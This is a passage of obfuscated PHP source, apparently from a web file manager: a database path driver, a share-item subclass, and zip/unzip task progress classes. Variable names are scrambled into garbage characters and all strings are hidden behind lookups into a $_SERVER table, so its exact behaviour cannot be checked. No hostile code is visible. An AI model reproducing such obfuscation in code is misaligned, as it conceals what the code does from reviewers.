{ $ßÑó¦üù = $this->parse($ë²´İŸ); $ßÑó¦üù = $this->infoSimple($ë²´İŸ); return $ßÑó¦üù ? $ßÑó¦üù[$_SERVER[Ï×Œõ”û][192]] : !1; } public function pathThis($ÍÔê€Ô±) { $Éáªš = $this->infoSimple($ÍÔê€Ô±); return $Éáªš ? $Éáªš[$_SERVER[Ï×Œõ”û][32]] : !1; } public function getPathOuter($£‡ò¶Üß) { if (!$£‡ò¶Üß) { return $£‡ò¶Üß; } $Ê¿‚ş£ = $this->parse($£‡ò¶Üß); return KodIO::make($Ê¿‚ş£[$_SERVER[Ï×Œõ”û][484]]); } public function copyFolderFromIO($•¨Ÿ«™, $‡ÃÍ—­, $‡ŒïŠ˜ö, $Ì×ºêì, $Å¢ÄÜ°š) { $£â”ÀÇ = $this->model->copyFolderFromIO($•¨Ÿ«™, $‡ÃÍ—­, $‡ŒïŠ˜ö, $Ì×ºêì, $Å¢ÄÜ°š); return KodIO::make($£â”ÀÇ); } public function isParentOf($¢èÍ´•Í, $„“¬Ø´Ü) { return $this->model->isParentOf($¢èÍ´•Í, $„“¬Ø´Ü); } public function mkfile($ù±ÈëäÉ, $åÚÄßŠ = '', $ò›‘çÎ = REPEAT_RENAME) { $à‡£·âï =& $_SERVER[Ï×Œõ”û]; $·€Å£ş„ = $this->parse($ù±ÈëäÉ); $ù±ÈëäÉ = $·€Å£ş„[$à‡£·âï[484]]; for ($©Ò‡¹ØÅ = 0; $©Ò‡¹ØÅ < count($·€Å£ş„[$à‡£·âï[1488]]); $©Ò‡¹ØÅ++) { $¾È×ßÁÜ = $·€Å£ş„[$à‡£·âï[1488]][$©Ò‡¹ØÅ]; if ($©Ò‡¹ØÅ == count($·€Å£ş„[$à‡£·âï[1488]]) - 1) { $ù±ÈëäÉ = $this->model->mkfile($ù±ÈëäÉ, $¾È×ßÁÜ, $åÚÄßŠ, $ò›‘çÎ); break; } $ù±ÈëäÉ = $this->model->mkdir($ù±ÈëäÉ, $¾È×ßÁÜ, REPEAT_SKIP); } return $this->getPathOuter($ù±ÈëäÉ); } public function mkdir($¹ú¨¬³ó, $Àæ«™³£ = REPEAT_SKIP) { $Ş•ş§ë =& $_SERVER[Ï×Œõ”û]; $ÅÏ˜ú†² = $this->parse($¹ú¨¬³ó); $¹ú¨¬³ó = $ÅÏ˜ú†²[$Ş•ş§ë[484]]; for ($¶åæŒ¡ = 0; $¶åæŒ¡ < count($ÅÏ˜ú†²[$Ş•ş§ë[1488]]); $¶åæŒ¡++) { $«æ†³« = $ÅÏ˜ú†²[$Ş•ş§ë[1488]][$¶åæŒ¡]; $¹ú¨¬³ó = $this->model->mkdir($¹ú¨¬³ó, $«æ†³«, $Àæ«™³£); } return $this->getPathOuter($¹ú¨¬³ó); } public function copyFile($Ò¹ÈÕ’, $‡àâŞ‘±, $Øœûç¯ = REPEAT_REPLACE) { $ÓûóĞ·Õ =& $_SERVER[Ï×Œõ”û]; $Œ”¸’¢ü = $this->parse($‡àâŞ‘±); $°”ÌãÇÆ = $this->model->copy($Ò¹ÈÕ’, $Œ”¸’¢ü[$ÓûóĞ·Õ[484]], $Øœûç¯, $Œ”¸’¢ü[$ÓûóĞ·Õ[87]]); return $°”ÌãÇÆ ? $this->getPathOuter($°”ÌãÇÆ) : !1; } public function moveFile($ö‡çÏ©Ã, $°“«òò˜, $¤áÀ‡şô = REPEAT_REPLACE) { $ÜíÜôú¨ =& $_SERVER[Ï×Œõ”û]; $‡¥˜°ŸÍ = $this->parse($°“«òò˜); $ïæ‰Ÿ‘Ù = $this->model->move($ö‡çÏ©Ã, $‡¥˜°ŸÍ[$ÜíÜôú¨[484]], $¤áÀ‡şô, $‡¥˜°ŸÍ[$ÜíÜôú¨[87]]); return $ïæ‰Ÿ‘Ù ? $this->getPathOuter($ïæ‰Ÿ‘Ù) : !1; } public function copy($òâ…îùÕ, $Àı÷€Ø¿, $à¥´Í÷¥ = REPEAT_REPLACE, $ŒŸŠö¥ = false) { $Ó„¿š‚» = $this->parse($Àı÷€Ø¿); $ôµÓ‚ = $this->model->copy($òâ…îùÕ, $Ó„¿š‚»[$_SERVER[Ï×Œõ”û][484]], $à¥´Í÷¥, $ŒŸŠö¥); return $ôµÓ‚ ? $this->getPathOuter($ôµÓ‚) : !1; } public function moveSameAllow() { } public function move($³ºí±øÒ, $°ØÎÓ, $¬ûÖ¯®Ô = REPEAT_REPLACE, $¼™ë’£ = false) { $µ²òõ­ì = $this->parse($°ØÎÓ); $îàÚÖıı = $this->model->move($³ºí±øÒ, $µ²òõ­ì[$_SERVER[Ï×Œõ”û][484]], $¬ûÖ¯®Ô, $¼™ë’£); return $îàÚÖıı ? $this->getPathOuter($îàÚÖıı) : !1; } public function remove($üƒÛĞØó, $€¡ŒÏ‰ = true) { return $this->model->remove($üƒÛĞØó, $€¡ŒÏ‰); } public function rename($ô¼ä¡€, $“Ê¢î³æ) { $±è–êµÇ = $this->model->rename($ô¼ä¡€, $“Ê¢î³æ); return $±è–êµÇ ? $this->getPathOuter($ô¼ä¡€) : $±è–êµÇ; } public function size($íıŸŒîû) { $ÎŠŒ¿˜• = $this->infoSimple($íıŸŒîû); return $ÎŠŒ¿˜• ? $ÎŠŒ¿˜•[$_SERVER[Ï×Œõ”û][79]] : 0; } public function infoSimple($ñÀ¥ù) { return $this->model->sourceInfo($ñÀ¥ù); } public function info($ş–ö«öÉ) { return $this->infoParse($ş–ö«öÉ); } public function infoAuth($çÎ´ä½ğ) { return $this->infoParse($çÎ´ä½ğ, !1, !0); } public function infoWithChildren($Ëæò¢Ò—) { return $this->infoParse($Ëæò¢Ò—, !0); } protected function infoParse($²ğ¼Ë•Ö, $‚ÙöìáÄ = false, $èœÊ²Ù¡ = false) { if (!$‚ÙöìáÄ) { return $this->model->pathInfo($²ğ¼Ë•Ö, $èœÊ²Ù¡); } return $this->model->pathInfoMore($²ğ¼Ë•Ö); } public function infoFullSimple($¹­¥ëšÑ) { $†´Ã›¶· =& $_SERVER[Ï×Œõ”û]; $½ïØ×‡ê = explode($†´Ã›¶·[8], $¹­¥ëšÑ); $åü‰ğÉİ = implode($†´Ã›¶·[8], array_splice($½ïØ×‡ê, 1)); return $this->model->pathInfoByPath($½ïØ×‡ê[0], $åü‰ğÉİ); } public function infoFull($ìèÆœ—å) { $öğÑ“İ = $this->infoFullSimple($ìèÆœ—å); return is_array($öğÑ“İ) ? $this->model->pathInfo($öğÑ“İ[$_SERVER[Ï×Œõ”û][193]]) : !1; } public function hashSimple($½Òˆ¡¯Ô) { $İß›İİâ =& $_SERVER[Ï×Œõ”û]; $ŠŠÙ±Àò = $this->infoWithChildren($½Òˆ¡¯Ô); return $ŠŠÙ±Àò[$İß›İİâ[169]][$İß›İİâ[700]]; } public function hashMd5($«ëªÆÔâ) { $«ŸÉ¿ÌÕ =& $_SERVER[Ï×Œõ”û]; $ØÛçÇë§ = $this->infoWithChildren($«ëªÆÔâ); return $ØÛçÇë§[$«ŸÉ¿ÌÕ[169]][$«ŸÉ¿ÌÕ[568]]; } public function exist($í¦ïñ¢ò) { $İ¯êÕóí =& $_SERVER[Ï×Œõ”û]; $–¨ÓŒ¤Ü = $this->parse($í¦ïñ¢ò); if (!$–¨ÓŒ¤Ü[$İ¯êÕóí[87]]) { return $this->isFile($í¦ïñ¢ò) || $this->isFolder($í¦ïñ¢ò); } $ÈÃ÷ÑåŸ = array($İ¯êÕóí[497] => $–¨ÓŒ¤Ü[$İ¯êÕóí[484]], $İ¯êÕóí[32] => $–¨ÓŒ¤Ü[$İ¯êÕóí[87]]); $Ë¢ïòÎ­ = $this->model->where($ÈÃ÷ÑåŸ)->find(); return $Ë¢ïòÎ­ ? !0 : !1; } public function isFile($½¼œÙÃ) { $Æ´ØÛÚª =& $_SERVER[Ï×Œõ”û]; $ÅèÔŒï· = $this->infoSimple($½¼œÙÃ); return $ÅèÔŒï· && $ÅèÔŒï·[$Æ´ØÛÚª[505]] == $Æ´ØÛÚª[230] ? !0 : !1; } public function isFolder($½Ïˆˆ†ä) { $‘îÁü­Ğ =& $_SERVER[Ï×Œõ”û]; $½–şÂôû = $this->infoSimple($½Ïˆˆ†ä); return $½–şÂôû && $½–şÂôû[$‘îÁü­Ğ[505]] == $‘îÁü­Ğ[91] ? !0 : !1; } public function listPath($®ÑÀ‘Ä, $Îé¶Ò = false) { $Áƒâ£à… =& $_SERVER[Ï×Œõ”û]; if ($®ÑÀ‘Ä == $Áƒâ£à…[12]) { return !1; } $“¾êâØ¾ = array($Áƒâ£à…[497] => $®ÑÀ‘Ä); if ($Îé¶Ò) { return $this->model->listSource($“¾êâØ¾, -1); } return $this->model->listSource($“¾êâØ¾); } public function has($ÒÁ¬ìª’, $˜®²°ˆ = false, $Ä¾€®Ë¾ = null) { $ìšÂÊ‚± =& $_SERVER[Ï×Œõ”û]; $šÕ¬ˆÙè = $this->infoWithChildren($ÒÁ¬ìª’); if ($˜®²°ˆ) { return array($ìšÂÊ‚±[242] => $šÕ¬ˆÙè[$ìšÂÊ‚±[242]], $ìšÂÊ‚±[241] => $šÕ¬ˆÙè[$ìšÂÊ‚±[241]]); } return $Ä¾€®Ë¾ ? $šÕ¬ˆÙè[$ìšÂÊ‚±[242]] : $šÕ¬ˆÙè[$ìšÂÊ‚±[241]]; } public function listAll($°É…ŞÔÌ) { $ûİ’Œ³ñ = IO::info($this->pathParse[$_SERVER[Ï×Œõ”û][87]]); if (!$ûİ’Œ³ñ) { return array(); } return $this->model->listAll($°É…ŞÔÌ); } public function getContent($¡‚§ïì) { return $this->model->getContent($¡‚§ïì); } public function setContent($‰˜ £¯à, $æªİ†é = '') { return $this->model->setContent($‰˜ £¯à, $æªİ†é); } public function fileSubstr($òµıÙ×, $€ÑÑû, $ş»ãê‘Í) { return $this->model->fileSubstr($òµıÙ×, $€ÑÑû, $ş»ãê‘Í); } public function download($ˆß’Òƒ, $ª¥Í¯Øõ = '') { $èÁÒ¦¢º = get_path_father($ª¥Í¯Øõ); $•¿§Š­¤ = get_path_this($ª¥Í¯Øõ); $æ–î¬üÈ = $this->model->fileInfoGet($ˆß’Òƒ); $æ‰›·å = IO::copy($æ–î¬üÈ[$_SERVER[Ï×Œõ”û][87]], $èÁÒ¦¢º, !1, $•¿§Š­¤); return $æ‰›·å; } public function setModifyTime($€¹·íÌ‘, $¹í€ØÊ = '') { $ĞşÂ°“ =& $_SERVER[Ï×Œõ”û]; if (!$€¹·íÌ‘) { return; } $this->model->where(array($ĞşÂ°“[511] => $€¹·íÌ‘))->save(array($ĞşÂ°“[88] => $¹í€ØÊ)); } public function upload($Ê—´á‚è, $½¶æŒ, $Ãá×ú­‚ = false, $°¶–È½è = REPEAT_REPLACE) { $Ù¤½ÃæÔ =& $_SERVER[Ï×Œõ”û]; $·”ãò¾Æ = $this->parse($Ê—´á‚è); $ÊŞß‡æ  = $this->model->addFile($·”ãò¾Æ[$Ù¤½ÃæÔ[484]], $½¶æŒ, $·”ãò¾Æ[$Ù¤½ÃæÔ[87]], $Ãá×ú­‚, $°¶–È½è); return $this->getPathOuter($ÊŞß‡æ ); } public function uploadFileByID($ÊúõÁõÂ, $ë€“âµú, $æêØ—”·) { $¹âïƒÈ± =& $_SERVER[Ï×Œõ”û]; $Ÿä“‡Õå = $this->parse($ÊúõÁõÂ); $«ñ—§©‡ = $this->model->addFileByFileID($Ÿä“‡Õå[$¹âïƒÈ±[484]], $ë€“âµú, $Ÿä“‡Õå[$¹âïƒÈ±[87]], $æêØ—”·); return $this->getPathOuter($«ñ—§©‡); } public function addFileByRemote($ÍôçÄä, $Ç®îÚõó, $¤åŸŒŒ„ = array(), $ğ»²æû¡ = '', $¯¬â¸İš) { $ÚÏùªÖµ =& $_SERVER[Ï×Œõ”û]; $’»×½Æ… = $this->parse($ÍôçÄä); $ğ»²æû¡ = empty($ğ»²æû¡) ? $’»×½Æ…[$ÚÏùªÖµ[87]] : $ğ»²æû¡; $ƒ¦ó…ßø = $this->model->addFileByRemote($’»×½Æ…[$ÚÏùªÖµ[484]], $Ç®îÚõó, $ğ»²æû¡, $¤åŸŒŒ„, $¯¬â¸İš); return $this->getPathOuter($ƒ¦ó…ßø); } public function uploadLink($ıó­Àúè, $Ô€¢ù–û = 0) { $ö†ƒÍö =& $_SERVER[Ï×Œõ”û]; $öè¤ì… = $this->parse($ıó­Àúè); $¶©ä¡†ë = _get($GLOBALS[$ö†ƒÍö[7]], $ö†ƒÍö[1489]); $¡ñÅÜÛ = _get($GLOBALS[$ö†ƒÍö[7]], $ö†ƒÍö[1490]); $‘’Èéü‚ = KodIO::ioFileDriverGet($ö†ƒÍö[503] . $öè¤ì…[$ö†ƒÍö[484]] . $ö†ƒÍö[404]); $Š”“¬Ì® = Model($ö†ƒÍö[702])->createFileName($öè¤ì…[$ö†ƒÍö[87]], $‘’Èéü‚, $¶©ä¡†ë, $¡ñÅÜÛ); return IO::uploadLink($Š”“¬Ì®, $Ô€¢ù–û); } public function fileNameAuto($Àî±ûÂ¶, $ï‹óİÉ©, $ÔÃò‡Ş– = REPEAT_REPLACE, $Ş’Îà¯ü = false) { return $this->model->fileNameAuto($Àî±ûÂ¶, $ï‹óİÉ©, $ÔÃò‡Ş–, $Ş’Îà¯ü); } public function fileNameExist($ĞéÙ¨Ë¨, $’Ì­¼ÆË) { return $this->model->fileNameExist($ĞéÙ¨Ë¨, $’Ì­¼ÆË); } protected function _fileOut($“ô­†Ÿä, $öÏ¾„Ò¾ = false, $”§Ó“ñ = false, $•Î†ÀçÔ = '', $Ø¼¡ºü§ = false) { $¡ıÕçà¤ =& $_SERVER[Ï×Œõ”û]; $ï¡ı—»ä = $this->model->sourceInfo($“ô­†Ÿä); if ($ï¡ı—»ä[$¡ıÕçà¤[505]] == $¡ıÕçà¤[91]) { header($¡ıÕçà¤[1491]); die; } $Ã¨šêæÇ = $this->model->fileInfoGet($“ô­†Ÿä); $•Î†ÀçÔ = $Ã¨šêæÇ[$¡ıÕçà¤[568]] ? $Ã¨šêæÇ[$¡ıÕçà¤[568]] : $•Î†ÀçÔ; $´†Š¤«§ = isset($GLOBALS[$¡ıÕçà¤[182]]) && is_array($GLOBALS[$¡ıÕçà¤[182]]) ? $GLOBALS[$¡ıÕçà¤[182]][$¡ıÕçà¤[32]] : $ï¡ı—»ä[$¡ıÕçà¤[32]]; if ($Ø¼¡ºü§) { return IO::fileOutServer($Ã¨šêæÇ[$¡ıÕçà¤[87]], $öÏ¾„Ò¾, $´†Š¤«§, $•Î†ÀçÔ); } IO::fileOut($Ã¨šêæÇ[$¡ıÕçà¤[87]], $öÏ¾„Ò¾, $´†Š¤«§, $•Î†ÀçÔ); } public function fileOut($·ÒŠóµ’, $Ùº•¡û¡ = false, $ƒşñ» = false, $²ÓÓË = '') { $this->_fileOut($·ÒŠóµ’, $Ùº•¡û¡, $ƒşñ», $²ÓÓË); } public function fileOutServer($é±Çõ, $æî˜­²ù = false, $Ş¤èĞ° = false, $…ß‰Î = '') { $this->_fileOut($é±Çõ, $æî˜­²ù, $Ş¤èĞ°, $…ß‰Î, !0); } protected function _fileOutImage($¨™×äÅ, $¬âµñ´Ö = 250) { $¥ î‰ùŞ =& $_SERVER[Ï×Œõ”û]; $ú³ü¡®ğ = $this->model->pathInfo($¨™×äÅ); if ($ú³ü¡®ğ[$¥ î‰ùŞ[505]] == $¥ î‰ùŞ[91]) { show_json($¥ î‰ùŞ[1492] . $¨™×äÅ, !1); } $Ø‰â©ŒĞ = $this->model->fileInfoGet($¨™×äÅ); $ú³ü¡®ğ[$¥ î‰ùŞ[183]] = $Ø‰â©ŒĞ[$¥ î‰ùŞ[87]]; $GLOBALS[$¥ î‰ùŞ[182]] = $ú³ü¡®ğ; IO::fileOutImage($Ø‰â©ŒĞ[$¥ î‰ùŞ[87]], $¬âµñ´Ö); } public function fileOutImage($´€Ã•˜Ú, $ ı’‰Áú = 250) { $this->_fileOutImage($´€Ã•˜Ú, $ ı’‰Áú); } public function fileOutImageServer($åÅĞ©‚, $£ªÇóÖ = 250) { $this->_fileOutImage($åÅĞ©‚, $£ªÇóÖ); } public function link($¥´ƒÑ¶Ó, $Íëİåˆ˜ = '') { $ âÛÛ­Î = $this->model->fileInfoGet($¥´ƒÑ¶Ó); return IO::link($ âÛÛ­Î[$_SERVER[Ï×Œõ”û][87]], $Íëİåˆ˜); } protected function parse($İ‹‰¢åŠ) { $ºç»¥£« =& $_SERVER[Ï×Œõ”û]; if (strstr($İ‹‰¢åŠ, $ºç»¥£«[8]) === !1) { return array($ºç»¥£«[513] => intval($İ‹‰¢åŠ), $ºç»¥£«[87] => $ºç»¥£«[12], $ºç»¥£«[1488] => array()); } $—½‘Ğ½˜ = explode($ºç»¥£«[8], trim($İ‹‰¢åŠ, $ºç»¥£«[8])); if (count($—½‘Ğ½˜) < 2) { show_tips(clear_html($İ‹‰¢åŠ) . $ºç»¥£«[1493]); } return array($ºç»¥£«[513] => intval($—½‘Ğ½˜[0]), $ºç»¥£«[87] => $—½‘Ğ½˜[1], $ºç»¥£«[1488] => array_slice($—½‘Ğ½˜, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($§ÚÊ‰¿š) { $this->pathParse = $§ÚÊ‰¿š; $this->model = Model($_SERVER[Ï×Œõ”û][1487]); } public function getPathRoot() { $¸ƒû‚ÏÉ =& $_SERVER[Ï×Œõ”û]; return KodIO::makeShare($this->pathParse[$¸ƒû‚ÏÉ[484]], $this->pathParse[$¸ƒû‚ÏÉ[1311]]); } public function getPathOuter($ÒÄ©Ã°¬) { $±ûŠŠ¼š =& $_SERVER[Ï×Œõ”û]; if (!$ÒÄ©Ã°¬) { return $ÒÄ©Ã°¬; } $«Şîú¥Ÿ = $this->parse($ÒÄ©Ã°¬); return trim(KodIO::makeShare($this->pathParse[$±ûŠŠ¼š[484]], $«Şîú¥Ÿ[$±ûŠŠ¼š[484]]), $±ûŠŠ¼š[8]); } public function isParentOf($È¡Ê€±“, $âú££›) { $ïû”¯â = IO::init($âú££›); return $this->model->isParentOf($È¡Ê€±“, $ïû”¯â->path); } protected function infoParse($ÍÕ²øÃ™, $¡½ƒÛÆ• = false, $øÕáÄÇ¥ = false) { $”†¤Ãğ© =& $_SERVER[Ï×Œõ”û]; static $Ç²ŸüœÜ = array(); $ºŒ÷ª¯® = $this->pathParse[$”†¤Ãğ©[484]]; $üƒÚü‚» = trim($this->pathParse[$”†¤Ãğ©[1307]], $”†¤Ãğ©[8]); if (isset($Ç²ŸüœÜ[$üƒÚü‚»]) && is_array($Ç²ŸüœÜ[$üƒÚü‚»])) { return $Ç²ŸüœÜ[$üƒÚü‚»]; } $ÑÜ‹Â¤× = Action($”†¤Ãğ©[1494])->sharePathInfo($ºŒ÷ª¯®, $üƒÚü‚», $¡½ƒÛÆ•); $Ç²ŸüœÜ[$üƒÚü‚»] = $ÑÜ‹Â¤×; return $ÑÜ‹Â¤×; } public function infoFull($Ä£¦«†¹) { $ååÜªĞÌ =& $_SERVER[Ï×Œõ”û]; $Éò±ƒ = explode($ååÜªĞÌ[8], trim($Ä£¦«†¹, $ååÜªĞÌ[8])); if (count($Éò±ƒ) > 1) { $ïÙŒû—Ü = implode($ååÜªĞÌ[8], array_splice($Éò±ƒ, 1)); $Ô±ª÷Â² = $this->model->pathInfoByPath($Éò±ƒ[0], $ïÙŒû—Ü); if (!$Ô±ª÷Â²) { return !1; } $this->pathParse[$ååÜªĞÌ[1307]] = $Ô±ª÷Â²[$ååÜªĞÌ[193]]; } return $this->infoParse($Ä£¦«†¹); } public function listAll($ğÓŒ¿“¦) { $‚ûÏØöš =& $_SERVER[Ï×Œõ”û]; $›ÔÖ£ï² = IO::info($this->pathParse[$‚ûÏØöš[87]]); if (!$›ÔÖ£ï²) { return array(); } $ãƒªò¹î = $this->model->listAll($ğÓŒ¿“¦); $¹ÀÌõ‘“ = Model($‚ûÏØöš[692])->getInfo($›ÔÖ£ï²[$‚ûÏØöš[693]]); foreach ($ãƒªò¹î as &$‰Áİ‚üî) { check_abort(); $‰Áİ‚üî[$‚ûÏØöš[90]] = Action($‚ûÏØöš[1494])->_shareItemeParse($‰Áİ‚üî[$‚ûÏØöš[90]], $¹ÀÌõ‘“); } unset($‰Áİ‚üî); return $ãƒªò¹î; } } goto E¼îš™ÕãË; A×é‰ÀÁÛ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $éó¶çæ =& $_SERVER[Ï×Œõ”û]; parent::startAfter(); Hook::bind($éó¶çæ[2055], array($this, $éó¶çæ[2056])); Hook::bind($éó¶çæ[1335], array($this, $éó¶çæ[2057])); Hook::bind($éó¶çæ[2058], array($this, $éó¶çæ[2059])); $”À¸ë‘Ö =& $this->task; $”À¸ë‘Ö[$éó¶çæ[2060]] = $éó¶çæ[1336]; if (!$”À¸ë‘Ö[$éó¶çæ[1818]]) { $”À¸ë‘Ö[$éó¶çæ[1818]] = LNG($éó¶çæ[2061]); } } protected function endAfter() { $”î»¯ä¾ =& $_SERVER[Ï×Œõ”û]; parent::endAfter(); Hook::unbind($”î»¯ä¾[2055], array($this, $”î»¯ä¾[2056])); Hook::unbind($”î»¯ä¾[1335], array($this, $”î»¯ä¾[2057])); Hook::unbind($”î»¯ä¾[2058], array($this, $”î»¯ä¾[2059])); } public function updateAfter() { $à¤·Ğ®ø =& $_SERVER[Ï×Œõ”û]; $áßœŒÙˆ =& $this->task; if (!$áßœŒÙˆ[$à¤·Ğ®ø[1183]] || !$áßœŒÙˆ[$à¤·Ğ®ø[870]]) { if ($áßœŒÙˆ[$à¤·Ğ®ø[2060]] != $à¤·Ğ®ø[390]) { return; } } if ($áßœŒÙˆ[$à¤·Ğ®ø[2060]] == $à¤·Ğ®ø[1336]) { $åóóò­’ = 0; if ($áßœŒÙˆ[$à¤·Ğ®ø[1983]]) { $åóóò­’ = $áßœŒÙˆ[$à¤·Ğ®ø[1984]] / $áßœŒÙˆ[$à¤·Ğ®ø[1983]]; } $áßœŒÙˆ[$à¤·Ğ®ø[1931]] = $åóóò­’ * 0.3; } else { if ($áßœŒÙˆ[$à¤·Ğ®ø[2060]] == $à¤·Ğ®ø[390]) { $åóóò­’ = $áßœŒÙˆ[$à¤·Ğ®ø[1930]] / $áßœŒÙˆ[$à¤·Ğ®ø[1183]]; $áßœŒÙˆ[$à¤·Ğ®ø[1931]] = 0.3 + $åóóò­’ * 0.4; } else { if ($áßœŒÙˆ[$à¤·Ğ®ø[2060]] == $à¤·Ğ®ø[108]) { $„’Ü‘ªÛ = 0; if ($áßœŒÙˆ[$à¤·Ğ®ø[1985]] == $à¤·Ğ®ø[108]) { $„’Ü‘ªÛ = $áßœŒÙˆ[$à¤·Ğ®ø[1984]]; } $åóóò­’ = ($áßœŒÙˆ[$à¤·Ğ®ø[1988]] + $„’Ü‘ªÛ) / $áßœŒÙˆ[$à¤·Ğ®ø[870]]; $áßœŒÙˆ[$à¤·Ğ®ø[1931]] = 0.3 + 0.4 + $åóóò­’ * 0.3; } } } if ($áßœŒÙˆ[$à¤·Ğ®ø[1931]] > 0) { $ñ‹¶ŸñÉ = timeFloat() - $áßœŒÙˆ[$à¤·Ğ®ø[1933]] - $áßœŒÙˆ[$à¤·Ğ®ø[1936]]; $áßœŒÙˆ[$à¤·Ğ®ø[1937]] = $ñ‹¶ŸñÉ * (1 - $áßœŒÙˆ[$à¤·Ğ®ø[1931]]) / $áßœŒÙˆ[$à¤·Ğ®ø[1931]]; } } public function addFile($½ºŒœ®¥) { $¬ÑÈ¯ÃÕ =& $_SERVER[Ï×Œõ”û]; $÷Û­Èõø =& $this->task; $’¯ğŒï = IO::info($½ºŒœ®¥); $÷Û­Èõø[$¬ÑÈ¯ÃÕ[1981]] = $’¯ğŒï[$¬ÑÈ¯ÃÕ[32]]; $÷Û­Èõø[$¬ÑÈ¯ÃÕ[1983]] = $’¯ğŒï[$¬ÑÈ¯ÃÕ[79]]; $÷Û­Èõø[$¬ÑÈ¯ÃÕ[1984]] = 0; $÷Û­Èõø[$¬ÑÈ¯ÃÕ[1185]] = $¬ÑÈ¯ÃÕ[2012]; $÷Û­Èõø[$¬ÑÈ¯ÃÕ[1985]] = $¬ÑÈ¯ÃÕ[1336]; $÷Û­Èõø[$¬ÑÈ¯ÃÕ[870]] = $’¯ğŒï[$¬ÑÈ¯ÃÕ[79]]; $÷Û­Èõø[$¬ÑÈ¯ÃÕ[1183]] = 1; $úçĞõƒì = 0; $÷Û­Èõø[$¬ÑÈ¯ÃÕ[1994]] = array($¬ÑÈ¯ÃÕ[1995] => $úçĞõƒì + 1, $¬ÑÈ¯ÃÕ[514] => $’¯ğŒï[$¬ÑÈ¯ÃÕ[32]], $¬ÑÈ¯ÃÕ[87] => $’¯ğŒï[$¬ÑÈ¯ÃÕ[87]], $¬ÑÈ¯ÃÕ[607] => $’¯ğŒï[$¬ÑÈ¯ÃÕ[607]] ? $’¯ğŒï[$¬ÑÈ¯ÃÕ[607]] : $’¯ğŒï[$¬ÑÈ¯ÃÕ[87]]); $this->update(); } public function zipEvent($öŸåè“Ò, $‹ë¦‡²Ì, $¶ûíïéÒ, $†ÒˆÛ”›) { $¾ù„­Êî =& $_SERVER[Ï×Œõ”û]; $îŒ²ú„Î =& $this->task; $îŒ²ú„Î[$¾ù„­Êî[1981]] = get_path_this($‹ë¦‡²Ì); $îŒ²ú„Î[$¾ù„­Êî[1983]] = $†ÒˆÛ”›; $îŒ²ú„Î[$¾ù„­Êî[1984]] = $¶ûíïéÒ; $îŒ²ú„Î[$¾ù„­Êî[1185]] = $öŸåè“Ò == $¾ù„­Êî[2062] ? $¾ù„­Êî[2063] : $¾ù„­Êî[2064]; $îŒ²ú„Î[$¾ù„­Êî[1985]] = $¾ù„­Êî[12]; $îŒ²ú„Î[$¾ù„­Êî[870]] = $†ÒˆÛ”›; $îŒ²ú„Î[$¾ù„­Êî[2060]] = $¾ù„­Êî[390]; $this->update(); } public function unzipAfter($‚¹íÍÔ») { $¤§üÈ•Ú =& $_SERVER[Ï×Œõ”û]; $°ÙâÊç… =& $this->task; $°ÙâÊç…[$¤§üÈ•Ú[2060]] = $¤§üÈ•Ú[108]; $Ì³Å®˜ü = IO::infoWithChildren($‚¹íÍÔ»); $ô¦°ãœğ = 0; $°ÙâÊç…[$¤§üÈ•Ú[1994]] = array($¤§üÈ•Ú[1995] => $ô¦°ãœğ + 1, $¤§üÈ•Ú[514] => $Ì³Å®˜ü[$¤§üÈ•Ú[32]], $¤§üÈ•Ú[87] => $Ì³Å®˜ü[$¤§üÈ•Ú[87]], $¤§üÈ•Ú[607] => $Ì³Å®˜ü[$¤§üÈ•Ú[607]] ? $Ì³Å®˜ü[$¤§üÈ•Ú[607]] : $Ì³Å®˜ü[$¤§üÈ•Ú[87]]); if ($Ì³Å®˜ü[$¤§üÈ•Ú[33]] == $¤§üÈ•Ú[232]) { $°ÙâÊç…[$¤§üÈ•Ú[1183]] = 1; } else { $°ÙâÊç…[$¤§üÈ•Ú[1183]] = $Ì³Å®˜ü[$¤§üÈ•Ú[82]][$¤§üÈ•Ú[80]]; } $°ÙâÊç…[$¤§üÈ•Ú[1185]] = $¤§üÈ•Ú[12]; $°ÙâÊç…[$¤§üÈ•Ú[1985]] = 0; $°ÙâÊç…[$¤§üÈ•Ú[1930]] = 0; $°ÙâÊç…[$¤§üÈ•Ú[1983]] = 0; $°ÙâÊç…[$¤§üÈ•Ú[1984]] = 0; $°ÙâÊç…[$¤§üÈ•Ú[1981]] = $¤§üÈ•Ú[12]; $°ÙâÊç…[$¤§üÈ•Ú[1988]] = 0; $°ÙâÊç…[$¤§üÈ•Ú[870]] = $Ì³Å®˜ü[$¤§üÈ•Ú[79]]; $this->update(); self::log($¤§üÈ•Ú[2065] . json_encode(array($°ÙâÊç…, $Ì³Å®˜ü))); } public function nameParse($®¶ô…ŸÈ) { $èÕğŒÀÜ =& $_SERVER[Ï×Œõ”û]; $×÷û±à =& $this->task; if ($×÷û±à[$èÕğŒÀÜ[2060]] == $èÕğŒÀÜ[1336]) { $×÷û±à[$èÕğŒÀÜ[2060]] = $èÕğŒÀÜ[390]; $×÷û±à[$èÕğŒÀÜ[1988]] = 0; $×÷û±à[$èÕğŒÀÜ[870]] = 0; } $É×¢–¥Ä = get_path_this($®¶ô…ŸÈ); if (strstr($É×¢–¥Ä, $èÕğŒÀÜ[10])) { $×÷û±à[$èÕğŒÀÜ[1930]] += 1; $×÷û±à[$èÕğŒÀÜ[1183]] += 1; } $×÷û±à[$èÕğŒÀÜ[1981]] = $®¶ô…ŸÈ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Æ¯òëµ¼ =& $_SERVER[Ï×Œõ”û]; parent::startAfter(); Hook::bind($Æ¯òëµ¼[2066], array($this, $Æ¯òëµ¼[2056])); Hook::bind($Æ¯òëµ¼[2058], array($this, $Æ¯òëµ¼[2059])); $ÓÉë±÷í =& $this->task; $ÓÉë±÷í[$Æ¯òëµ¼[2060]] = $Æ¯òëµ¼[1336]; if (!$ÓÉë±÷í[$Æ¯òëµ¼[1818]]) { $ÓÉë±÷í[$Æ¯òëµ¼[1818]] = LNG($Æ¯òëµ¼[2067]); } } protected function endAfter() { $ˆ¯ú¢ôã =& $_SERVER[Ï×Œõ”û]; parent::endAfter(); Hook::unbind($ˆ¯ú¢ôã[2066], array($this, $ˆ¯ú¢ôã[2056])); Hook::unbind($ˆ¯ú¢ôã[2058], array($this, $ˆ¯ú¢ôã[2059])); } public function updateAfter() { $Ã¢€¯ÅÑ =& $_SERVER[Ï×Œõ”û]; $˜åÓ™”ö =& $this->task; if (!$˜åÓ™”ö[$Ã¢€¯ÅÑ[1183]] || 